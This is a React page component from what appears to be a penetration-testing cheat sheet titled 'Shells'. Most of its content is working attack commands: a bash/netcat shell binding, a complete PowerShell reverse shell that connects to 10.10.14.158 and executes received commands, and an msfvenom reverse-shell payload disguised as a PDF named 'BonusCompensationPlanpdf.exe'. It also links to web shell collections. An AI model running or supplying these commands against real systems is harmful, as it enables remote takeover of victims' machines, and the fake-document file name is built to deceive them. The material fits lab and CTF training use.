import { Link } from "react-router-dom";
import shell from '../../assets/shell.png';
import ExampleFrame from "../exampleFrame/ExampleFrame";

const Shell = () =>{
     return(
        <section>
            <h1>Shells</h1>
            
            <h2>Binding a Bash shell to the TCP session</h2>
            <div className="waring">
                <p>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2{`>`}&1 | nc -l <span className="important">{`<Nasze ip>`}</span> 7777 {`>`} /tmp/f</p>
            </div>

            <h2>Powershell</h2>
            <div className="waring">
                <p><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`};$client.Close()"</code></p>
            </div>

            <hr />
            <h2>Payload msfvenom</h2>
            <p>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe {`>`} BonusCompensationPlanpdf.exe</p>
            
            <hr/>
            <h2>Web shells</h2>
            <Link to='https://github.com/FilipowiczP/web-shells'>Web Shells</Link>
            <Link to='https://github.com/FilipowiczP/nishang/tree/master/Antak-WebShell'>Web Terminal</Link>
            <ExampleFrame screen={shell} />
        </section>
     )
}

export default Shell;